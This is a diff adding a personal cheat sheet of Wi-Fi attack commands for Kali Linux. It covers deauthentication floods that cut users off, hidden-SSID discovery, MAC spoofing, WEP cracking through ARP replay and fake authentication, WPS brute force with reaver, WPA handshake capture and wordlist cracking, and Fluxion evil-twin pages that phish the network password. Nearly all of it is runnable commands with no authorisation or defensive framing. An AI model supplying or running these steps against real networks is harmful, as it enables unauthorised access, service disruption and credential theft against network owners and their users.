@@ -1,0 +1,144 @@
+
+
+ A-) first we should connect an alpha card and trun it to monitor mode, there is two ways to do that:
+	1-) $iwconfig
+	    $airmon-ng start wlan0
+	
+	2-) $iwconfig
+	    $sudo ifconfig wlan0 down
+	    $sudo iwconfig wlan0 mode monitor
+	    $sudo ifconfig wlan0 up
+
+now we can scan all nearby wifi with $airodump-ng wlan0
+then choose the one that we want and write the following to see more information about the connected devices:
+	airodump-ng wlan0 --bssid <target bssid>
+
+however we might find some problems that make the airodump dont work, here are some ways to solve it:
+$systemctl restart network.service
+$airmon-ng then $sudo apt-get install firmware-<alpha card company name>
+$airmon-ng check kill
+
+ B-) extract the hidden wifi name:
+	make the alpha card on the same channel of the wifi : 
+		$iwconfig wlan0 channel <channel>
+		$airodump-ng wlan0 --bssid <bssid>
+	then to show the hidden name either i wait for some one to connect to the wifi (passive)
+	or i disconnect anyone and he will reconnect again (active) and we do than as follow:
+		$echo <someone mac> > blacklist.txt
+		$mdk3 wlan0 blacklist.txt -c <channel>
+	and boom the name was discovered
+
+ C-) change the mac address,two ways:
+	1-) the mac reset automaticly after restart:
+		$sudo ifconfig wlan0 down
+		$sudo ifconfig wlan0 hw ether 00:11:22:33:44:55
+		$sudo ifconfig wlan0 up
+
+	2-) the mac stay after restarting:
+		$nano /etc/NetworkManager/networkmanager.conf
+		then add the following:
+			[device]
+			wifi.scan-rand-mac-address=no
+
+			[connection]
+			ethernet.cloned-mac-address=preserve	
+			wifi.cloned-mac-address=preserve
+		and now repeat #1 method
+
+ D-) there is wifi but there is no internet:
+	1-) for all users:
+		$aireplay-ng -a <bssid> --deauth 1000 wlan0
+				                 ^^^^
+			        	         number of packets  
+
+	2-) for a spicific user:
+		$airodump-ng --bssid <bssid> --channel <ch number> wlan0
+		$aireplay-ng -a <bssid> -c <target mac> --deauth 1000 wlan0
+	
+ E-) attack WEP protected wifi, three ways:
+
+	1-) open three terminal:
+	    #in the first one we write:
+		$airodump-ng wlan0 --bssid <bssid> -c <channel> -w /home/kali/wifi/wifi
+	    we notice the DATA is rising too slow and we should make it reach 50 thousands
+	    we can wait or we can make it rising faster.
+
+	    #in the second one we write:
+		$airepaly-ng --arpreplay -e <ESSID> wlan0 -h <any mac that is connected to the wifi>
+	    we did that to make the wifi thinks that we are that person
+
+	    #in the third one we write:
+		$airreplay-ng --deauth 0 -e <ESSID> wlan0
+	    to disconnect every one from wifi. we should stop it after a short while.
+	    we notice the DATA is rising very fast. now we stop every thing and write:
+		$aircrak-ng wifi-01.cap 
+	    and boom we have the password.
+
+
+	2-) open three terminals:
+	    #in the first one we write:
+		$airodump-ng wlan0 --bssid <bssid> -c <channel> -w /home/kali/wifi/wifi
+	    we notice the DATA is rising too slow and we should make it reach 50 thousands
+	    we can wait or we can make it rising faster.
+
+	    #in the second one we write:
+		$airepaly-ng --fakeauth 0 -a <bssid> -h <my mac address> wlan0
+	    we did that to make us one of the connected users but in a fake way.
+
+	    #in the third one we write:
+		$airreplay-ng --arpreplay -b <bssid> -h <my mac address> wlan0
+	    we notice the DATA is rising very fast. now we stop every thing and write:
+		$aircrak-ng wifi-01.cap 
+	    and boom we have the password.
+	    
+
+	3-) automated attack with tool called "wifite"
+	    its so simple to use .it enables monitor mode and scan the nearby wifi automaticly.
+	    we can easly press ctrl+c and select any wifi we interested in and attack it with fake auth attack
+	    we again can press ctrl+c and choose any other attack we want
+
+ F-) attack WPA/WPA2 protected wifi through wps feature:
+	we write the following command to show all the wifi networks with wps feauture:
+		$wash -i wlan0
+	then we make a fake auth:
+		$airepaly-ng --fakeauth 20 -a <bssid> -h <my mac address> wlan0
+	and at the same time we will write the following command:
+		$reaver -b <bssid> -c <channel> -i wlan0 -vvv -A
+	and after some time we should get the key.
+	it will not work if PBC option is on.
+
+ G-) attack WPA/WPA2 protected wifi password using wordlist:
+	first we need to capture the handshake, so we write:
+		$airodump-ng wlan0 -c <channel> --bssid <bssid> -w /home/kali/wifi/handshake
+	then either we wait for somone to connect or disconnect a user and make him reconnect like that:
+		$airreplay-ng --deauth 5 -a <bssid> -c <someone mac address> wlan0
+	now we have the handshake but we wait until beacons reach at least a thousand then we call it down.
+	to ensure that the output file is good to crack we can upload it to website : GPUHASH.me
+	now we can crack the password with a wordlist like that:
+		$aircrack-ng -w rockyou.txt /home/kali/wifi/file.cap  
+ 
+ H-) attack WPA/WPA2 protected wifi password using fulxion:
+	$git clone https://github.com/wi-fi-analyzer/fluxion.git
+	$/home/kali/fluxion/install/install.sh
+	$/home/kali/fluxion/fluxion.sh
+     this tool will disconnect all the users from the wifi 
+     then get the handshake and create the SSL certification
+     then make a web page
+     then make a fake access point with the same name
+     then make the user connect to it
+     then when the user try open any website he well promopted to type the wifi password to continue
+     then the tool get it and show it to us
+
+
+ I-) make a fake access point with the same name:
+	$airbase-ng wlan0
+     then in another tap we write:
+	$ifconfig -a
+	$ifconfig at0 up
+     now we have our fake wifi and we can configure it anyway we want
+	$airbase-ng wlan0 -e <FakeAP Name> -a <fakeAP mac> -v
+     if we open airodump-ng we notice that the beacons is rising very fast and the channel isn't stable
+
+
+
+
